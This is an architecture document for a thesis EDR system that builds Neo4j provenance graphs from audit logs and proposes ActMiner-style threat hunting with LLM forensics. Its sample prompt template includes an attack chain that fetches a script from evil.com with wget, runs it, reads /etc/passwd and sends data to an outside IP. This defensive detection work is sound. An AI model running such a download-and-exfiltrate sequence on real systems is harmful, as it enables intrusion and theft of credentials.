# EDR System Architecture

**Thesis**: "Applying Causality Tracking and Incremental Alignment for Graph-Based Threat Hunting"

Based on the ActMiner paper (arXiv:2501.05793) adapted for real-time EDR.

---

## System Overview

```
+------------------+     +------------------+     +------------------+
|   Endpoint 1     |     |   Endpoint 2     |     |   Endpoint 3     |
|  +------------+  |     |  +------------+  |     |  +------------+  |
|  | EDR Agent  |  |     |  | EDR Agent  |  |     |  | EDR Agent  |  |
|  | (ETW/auditd)| |     |  |            |  |     |  |            |  |
|  +-----+------+  |     |  +-----+------+  |     |  +-----+------+  |
+--------|---------+     +--------|---------+     +--------|---------+
         |                        |                        |
         +------------+-----------+------------+-----------+
                      |  raw CDM events (JSON)
                      v
+=====================================================================+
|                         SERVER                                       |
|                                                                      |
|  +-------------------+    +------------------+    +---------------+  |
|  | Event Ingest      |--->| Graph Builder    |--->| Neo4j         |  |
|  | (normalizer.py)   |    | (main.py)        |    | (provenance   |  |
|  |                   |    |                  |    |  graph)        |  |
|  | RabbitMQ:         |    | RabbitMQ:        |    |               |  |
|  |  raw_events -->   |    |  normalized -->  |    | 6 node types  |  |
|  |  normalized_events|    |  Neo4j MERGE     |    | 9 edge types  |  |
|  +-------------------+    +------------------+    +-------+-------+  |
|                                                           |          |
|  LAYER 1-2: DONE                                          |          |
|  =========================================================|========  |
|  LAYER 3-5: NOT YET BUILT                                 |          |
|                                                           v          |
|  +-------------------+    +------------------+    +---------------+  |
|  | Graph ML Engine   |<---| Neo4j            |    | Dashboard     |  |
|  | (EST + scoring)   |    | (read subgraphs) |    | (React)       |  |
|  +--------+----------+    +------------------+    +-------^-------+  |
|           |                                               |          |
|           v                                               |          |
|  +-------------------+    +------------------+            |          |
|  | Alert Grouping    |--->| LLM Forensics    |------------+          |
|  | (threshold +      |    | (ATT&CK + IOCs)  |                      |
|  |  subgraph extract)|    +------------------+                      |
|  +-------------------+                                              |
|                                                                      |
+=====================================================================+
         |
         v  (response actions)
+------------------+
| Kill / Isolate / |
| Block            |
+------------------+
```

---

## Layer 1: Event Ingest (BUILT)

Normalizes raw CDM18 audit logs into typed provenance edges.

```
                     DARPA THEIA E3 JSON file
                     (or live EDR agent feed)
                              |
                              v
+------------------------------------------------------------------+
|                    SIMULATOR (main.py)                             |
|                                                                   |
|  1. Read JSON line from file                                      |
|  2. Unwrap envelope: line["datum"]                                |
|  3. Publish inner CDM datum to RabbitMQ                           |
|                                                                   |
|  Input:  {"datum": {"com.bbn.tc...Event": {...}}, "CDMVersion":18}|
|  Output: {"com.bbn.tc.schema.avro.cdm18.Event": {...}}            |
+------------------------------+-----------------------------------+
                               |
                  RabbitMQ exchange="ophanim"
                  routing_key="raw"
                  queue: raw_events
                               |
                               v
+------------------------------------------------------------------+
|                    INGEST (normalizer.py)                          |
|                                                                   |
|  TheiaNodeCache (in-memory dict):                                 |
|    _subjects: {uuid -> Subject dict}                              |
|    _objects:  {uuid -> FileObject/NetFlow/Pipe/Memory/Reg dict}   |
|                                                                   |
|  For each datum:                                                  |
|    1. If Subject/FileObject/NetFlow/etc -> cache by UUID          |
|    2. If Event:                                                   |
|       a. Lookup event.type in CDM_TO_EDGE map                    |
|       b. Skip if in SKIP_EVENTS (OPEN, CLOSE, MPROTECT, ...)    |
|       c. Resolve subject UUID -> ProvenanceNode (process)        |
|       d. Resolve predicateObject UUID -> ProvenanceNode          |
|          - For FORK/CLONE: resolve as Subject (child process)    |
|          - For others: resolve as Object (file/socket/etc)       |
|       e. For EXEC: enrich subject.name with cmdLine from event   |
|       f. Emit NormalizedEvent                                     |
|                                                                   |
|  Input:  raw CDM datum (dict)                                     |
|  Output: NormalizedEvent (pydantic model, JSON-serialized)        |
+------------------------------------------------------------------+

NormalizedEvent schema:
+---------------------------+
| event_id:    str (UUID)   |
| timestamp:   int (nanos)  |
| endpoint_id: str          |
| edge_type:   EdgeType     |   EdgeType enum:
| subject:     ProvNode     |     FORK, EXEC, READ, WRITE,
| object:      ProvNode     |     CONNECT, SEND, RECEIVE,
| size:        int | null   |     MMAP, RENAME, DELETE, LOAD
| properties:  dict         |
+---------------------------+

ProvenanceNode schema:
+---------------------------+
| node_type:  NodeType      |   NodeType enum:
| id:         str (UUID)    |     PROCESS, FILE, SOCKET,
| name:       str           |     REGISTRY, MEMORY, PIPE
| properties: dict          |
+---------------------------+
```

**Key design decisions:**
- Entity datums (Subject, FileObject, etc.) are cached *before* Events reference them, because THEIA interleaves definitions with events.
- `SKIP_EVENTS` filters ~50% of raw events that have no causal meaning (OPEN, CLOSE, MPROTECT, LSEEK, etc.).
- Socket naming handles THEIA sentinels ("NA", "LOCAL") to prevent mega-hub collapse.
- Subject naming prefers `properties.map.path` over `cmdLine` (which is often "N/A").

---

## Layer 2: Graph Builder (BUILT)

Incrementally merges normalized events into a Neo4j provenance graph.

```
                  RabbitMQ queue: normalized_events
                               |
                               v
+------------------------------------------------------------------+
|                GRAPH BUILDER (main.py)                             |
|                                                                   |
|  Batching:                                                        |
|    - Accumulate up to BATCH_SIZE=200 NormalizedEvents             |
|    - Flush on batch full or BATCH_TIMEOUT=2s                     |
|                                                                   |
|  Per batch:                                                       |
|    1. Group rows by (subj_label, obj_label, edge_type)           |
|       e.g. ("Process", "Process", "FORK")                        |
|            ("Process", "File", "READ")                           |
|            ("Process", "Socket", "CONNECT")                      |
|                                                                   |
|    2. For each group, build a Cypher query with STATIC labels:   |
|                                                                   |
|       UNWIND $rows AS row                                        |
|       MERGE (s:Process {uuid: row.subj_uuid})                    |
|         ON CREATE SET s.name = ..., s.first_seen = ...           |
|         ON MATCH SET  s.last_seen = ..., s.name = CASE ...       |
|       MERGE (o:File {uuid: row.obj_uuid})                        |
|         ON CREATE SET ...                                        |
|       CREATE (s)-[:READ {event_id, timestamp, size}]->(o)        |
|                                                                   |
|    3. Labels are interpolated (not parameterized) because         |
|       Cypher cannot parameterize labels or relationship types.    |
|       Labels are validated against an allowlist.                  |
|                                                                   |
|  Name upgrade logic:                                              |
|    ON MATCH: overwrite name only if                               |
|      - existing name is a placeholder (starts with "process:")   |
|      - OR new name is richer (contains a space = full cmdline)   |
+------------------------------------------------------------------+
                               |
                               v
+------------------------------------------------------------------+
|                     NEO4J GRAPH                                    |
|                                                                   |
|  Nodes (6 labels, each with uniqueness constraint on uuid):       |
|                                                                   |
|    (:Process {uuid, name, endpoint_id, properties,                |
|               first_seen, last_seen, node_type})                  |
|    (:File    {uuid, name, ...})                                   |
|    (:Socket  {uuid, name, ...})                                   |
|    (:Memory  {uuid, name, ...})                                   |
|    (:Pipe    {uuid, name, ...})                                   |
|    (:Registry{uuid, name, ...})                                   |
|                                                                   |
|  Edges (9 relationship types):                                    |
|                                                                   |
|    -[:FORK    {event_id, timestamp, size, properties}]->          |
|    -[:EXEC    {event_id, timestamp, size, properties}]->          |
|    -[:READ    ...]->                                              |
|    -[:WRITE   ...]->                                              |
|    -[:CONNECT ...]->                                              |
|    -[:SEND    ...]->                                              |
|    -[:RECEIVE ...]->                                              |
|    -[:MMAP    ...]->                                              |
|    -[:DELETE  ...]->                                              |
|                                                                   |
|  Current graph (30k THEIA events):                                |
|    119 Process, 1020 File, 223 Socket, 435 Memory                |
|    19,109 edges total                                             |
+------------------------------------------------------------------+
```

**Key design decisions:**
- MERGE (not CREATE) on nodes: same UUID = same entity, timestamps accumulate.
- CREATE (not MERGE) on edges: every event is a unique causal interaction.
- Batching (200 events, 2s timeout) balances throughput vs. latency.
- Neo4j labels are baked into query strings at build time (Cypher limitation).

---

## Layer 3: Graph ML Engine (NOT YET BUILT -- proposed)

Based on ActMiner's approach, adapted for our Neo4j-based pipeline.

### ActMiner Architecture (from the paper)

ActMiner does NOT use neural networks (no GAT, no GNN). It uses:

1. **Query Graph Processing (QGP)**: Build small attack-pattern graphs from
   CTI reports (e.g., "process forks child, child connects to external IP,
   child writes to /tmp"). These are 3-10 node subgraph templates.

2. **Subgraph Matching**: For each query graph, find matching subgraphs in the
   provenance graph using candidate search + temporal ordering.

3. **Equivalent Semantic Transfer (EST)**: Propagate "suspicious" labels
   through the graph along causal edges. Six transitivity policies:
   - Process --fork/clone--> Process: propagate suspicion
   - Process --write--> File: taint the file
   - File --execute/load--> Process: taint the process
   - File --read--> Process: propagate (weaker)
   - Process --inject--> Process: propagate
   - Multi-hop transitivity through intermediaries

4. **Causal Filtering**: Remove false-positive matches where temporal ordering
   or causal direction doesn't match the query graph pattern.

5. **Incremental Aligning**: Maintain a "suspicious semantic tree" in memory.
   When new events arrive, extend existing trees rather than re-scanning the
   entire graph. Nodes idle >6h get checkpointed to DB.

### Proposed our adaptation

```
+------------------------------------------------------------------+
|                   GRAPH ML ENGINE (proposed)                       |
|                                                                   |
|  +--------------------------+                                     |
|  | Query Graph Library      |                                     |
|  |                          |                                     |
|  | Pre-defined ATT&CK       |                                     |
|  | patterns as small graphs:|                                     |
|  |                          |                                     |
|  | QG1: Dropper             |     QG2: Lateral Movement           |
|  | P --fork--> P2           |     P --fork--> P2                  |
|  | P2 --connect--> S        |     P2 --exec--> F(/usr/bin/ssh)    |
|  | P2 --write--> F(/tmp/..) |     P2 --connect--> S(internal)     |
|  |                          |     P2 --send--> S                  |
|  | QG3: Data Exfil          |                                     |
|  | P --read--> F(sensitive) |     QG4: Persistence                |
|  | P --connect--> S(ext)    |     P --write--> F(cron/systemd)    |
|  | P --send--> S            |     P --exec--> F(chmod)            |
|  +-----------+--------------+                                     |
|              |                                                    |
|              v                                                    |
|  +--------------------------+                                     |
|  | Candidate Finder         |                                     |
|  |                          |                                     |
|  | For each QG node, query  |                                     |
|  | Neo4j for candidate      |                                     |
|  | matches by:              |                                     |
|  |   - node_type            |                                     |
|  |   - name pattern (regex) |                                     |
|  |   - edge connectivity    |                                     |
|  +-----------+--------------+                                     |
|              |                                                    |
|              v                                                    |
|  +--------------------------+                                     |
|  | EST Propagation          |                                     |
|  |                          |                                     |
|  | Walk forward from each   |                                     |
|  | candidate along causal   |                                     |
|  | edges. Apply 6 policies: |                                     |
|  |                          |                                     |
|  |  fork/clone: propagate   |                                     |
|  |  write:      taint file  |                                     |
|  |  exec/load:  taint proc  |                                     |
|  |  read:       weak taint  |                                     |
|  |  inject:     propagate   |                                     |
|  |                          |                                     |
|  | Each node gets a         |                                     |
|  | suspicion_score (0-1)    |                                     |
|  | with decay per hop       |                                     |
|  +-----------+--------------+                                     |
|              |                                                    |
|              v                                                    |
|  +--------------------------+                                     |
|  | Causal Filter            |                                     |
|  |                          |                                     |
|  | For each candidate match:|                                     |
|  |  1. Check temporal order |                                     |
|  |     matches QG sequence  |                                     |
|  |  2. Remove transitive    |                                     |
|  |     arcs (shortcuts)     |                                     |
|  |  3. Verify causal        |                                     |
|  |     direction matches    |                                     |
|  |                          |                                     |
|  | Reduces subgraph size    |                                     |
|  | by 60-80%                |                                     |
|  +-----------+--------------+                                     |
|              |                                                    |
|              v                                                    |
|  +--------------------------+                                     |
|  | Incremental Aligner      |                                     |
|  |                          |                                     |
|  | Maintains in-memory      |                                     |
|  | "suspicious semantic     |                                     |
|  | trees" -- one per active |                                     |
|  | investigation.           |                                     |
|  |                          |                                     |
|  | When new edges arrive    |                                     |
|  | from graph-builder:      |                                     |
|  |  - Check if edge extends |                                     |
|  |    an existing tree      |                                     |
|  |  - If yes: grow the tree,|                                     |
|  |    re-score              |                                     |
|  |  - If no: check if it    |                                     |
|  |    matches a QG entry    |                                     |
|  |    point -> new tree     |                                     |
|  |  - Prune idle nodes >6h  |                                     |
|  |                          |                                     |
|  | Output: scored subgraphs |                                     |
|  | with suspicion >= thresh  |                                     |
|  +-----------+--------------+                                     |
|              |                                                    |
|              v                                                    |
|         RabbitMQ queue: alerts                                    |
|         {subgraph_nodes, subgraph_edges,                          |
|          matched_query_graph, suspicion_score,                    |
|          matched_att&ck_technique}                                 |
+------------------------------------------------------------------+
```

### Why ActMiner over GAT/GNN

The previous CLAUDE.md described a GAT-based approach. The Miro diagram shows
something closer to ActMiner. Key reasons to prefer ActMiner:

| Aspect | GAT approach | ActMiner approach |
|--------|-------------|-------------------|
| Training data | Needs labeled normal/attack data | No training needed -- pattern matching |
| Explainability | Black-box anomaly scores | "This matches ATT&CK T1059 because P forked a shell that connected to external IP" |
| False positives | High (any unusual edge scores high) | Low (causal filter + temporal ordering eliminates 39% more FPs than baselines) |
| Incremental | Must retrain or fine-tune on graph changes | Naturally incremental (tree extension) |
| LLM integration | Feed raw scores to LLM | Feed matched ATT&CK pattern + causal subgraph to LLM |

---

## Layer 4: Alert Grouping (NOT YET BUILT -- proposed)

```
+------------------------------------------------------------------+
|                  ALERT GROUPING (proposed)                         |
|                                                                   |
|  Input:  scored subgraphs from ML Engine (via RabbitMQ alerts)    |
|                                                                   |
|  1. Threshold filter:                                             |
|     - suspicion_score >= 0.7 -> HIGH                              |
|     - suspicion_score >= 0.4 -> MEDIUM                            |
|     - below 0.4 -> discard                                       |
|                                                                   |
|  2. Subgraph extraction:                                          |
|     - Query Neo4j for the k-hop neighborhood around matched nodes |
|     - Include all edges in the causal chain                       |
|     - Attach node names, timestamps, file paths                  |
|                                                                   |
|  3. Deduplication:                                                |
|     - Group alerts sharing >50% of the same nodes                |
|     - Merge into single incident with highest score              |
|                                                                   |
|  Output: Incident{subgraph, score, att&ck_id, context}            |
|          -> LLM Forensics                                         |
|          -> Dashboard                                             |
+------------------------------------------------------------------+
```

---

## Layer 5: LLM Forensics + Dashboard (NOT YET BUILT -- proposed)

```
+------------------------------------------------------------------+
|                   LLM FORENSICS (proposed)                        |
|                                                                   |
|  Input: Incident{subgraph, score, att&ck_id}                     |
|                                                                   |
|  Prompt template:                                                 |
|    "You are an EDR analyst. The following causal subgraph was     |
|     flagged as suspicious (score={score}). It matches ATT&CK     |
|     technique {att&ck_id}.                                        |
|                                                                   |
|     Subgraph:                                                     |
|       Process '/bin/bash' (pid 1234)                              |
|         --FORK--> Process 'wget http://evil.com/payload.sh'       |
|           --CONNECT--> Socket '185.234.72.10:443'                 |
|           --WRITE--> File '/tmp/payload.sh'                       |
|         --FORK--> Process '/bin/bash /tmp/payload.sh'             |
|           --READ--> File '/etc/passwd'                            |
|           --CONNECT--> Socket '203.0.113.50:443'                  |
|           --SEND--> Socket '203.0.113.50:443' (150KB)            |
|                                                                   |
|     Provide:                                                      |
|     1. Verdict (malicious/suspicious/benign)                     |
|     2. ATT&CK techniques involved                                |
|     3. IOCs (IPs, file hashes, domains)                          |
|     4. Recommended response actions"                              |
|                                                                   |
|  Output: Verdict + narrative + IOCs + recommended actions         |
|          -> Dashboard                                             |
|          -> Response engine (optional)                            |
+------------------------------------------------------------------+

+------------------------------------------------------------------+
|                     DASHBOARD (proposed)                           |
|                                                                   |
|  React + Fluent UI (shell already exists at server/dashboard/)    |
|                                                                   |
|  Backend: FastAPI reading from Neo4j (Bolt) + alerts queue        |
|           (replaces current MongoDB backend)                      |
|                                                                   |
|  Views:                                                           |
|    1. Alert timeline -- incidents sorted by score                 |
|    2. Graph explorer -- interactive provenance subgraph view      |
|    3. Incident detail -- LLM verdict + ATT&CK mapping + IOCs    |
|    4. Endpoint overview -- which hosts have active alerts         |
+------------------------------------------------------------------+
```

---

## Data flow summary (all layers)

```
Endpoint (ETW/auditd)
    |
    | raw CDM18 JSON events
    v
[RabbitMQ: raw_events]          <-- LAYER 1: INGEST (BUILT)
    |
    | normalize: resolve UUIDs,
    | map event types, enrich names
    v
[RabbitMQ: normalized_events]
    |
    | batch MERGE into Neo4j     <-- LAYER 2: GRAPH BUILD (BUILT)
    v
[Neo4j: provenance graph]
    |
    | read subgraphs,            <-- LAYER 3: ML ENGINE (PROPOSED)
    | match query graphs,             ActMiner: QGP + EST +
    | EST propagation,                Causal Filter + Incremental Align
    | causal filtering
    v
[RabbitMQ: alerts]
    |
    | threshold, extract         <-- LAYER 4: ALERT GROUPING (PROPOSED)
    | subgraph, dedup
    v
[Incident]
    |
    +---> LLM Forensics          <-- LAYER 5: LLM + DASHBOARD (PROPOSED)
    |     (verdict + ATT&CK)
    |
    +---> Dashboard
    |     (React, reads Neo4j)
    |
    +---> Response (optional)
          (kill/isolate/block)
```

---

## Differences from Miro diagram

Minor adjustments from the architecture in the Miro board:

1. **Graph ML Engine reads from Neo4j, not directly from Graph Builder**.
   In the Miro diagram, Graph Builder feeds both Neo4j and ML Engine in
   parallel. In practice, the ML Engine should read the *committed* graph
   from Neo4j (after MERGE), not race with the builder. This ensures the
   subgraph query always sees consistent state.

2. **Alert Grouping is a separate service, not part of ML Engine**.
   The Miro diagram shows "Alert Grouping: Threshold -> Subgraph" as a
   distinct box. This is correct -- it should be its own lightweight
   process that consumes from the `alerts` queue, not embedded in the
   ML scoring loop.

3. **LLM Forensics receives from Alert Grouping, not ML Engine**.
   The Miro diagram correctly shows the flow as:
   ML Engine -> Alert Grouping -> LLM Forensics -> Dashboard.
   The LLM should never see raw edge scores -- only grouped, filtered,
   causally-cleaned incidents with ATT&CK context.

4. **Response loop goes back to endpoints via the EDR agent**.
   The Miro diagram shows Response (kill/isolate/block) connecting back
   to the endpoints. This is correct but out of scope for the thesis
   experiment -- we demonstrate detection, not automated response.
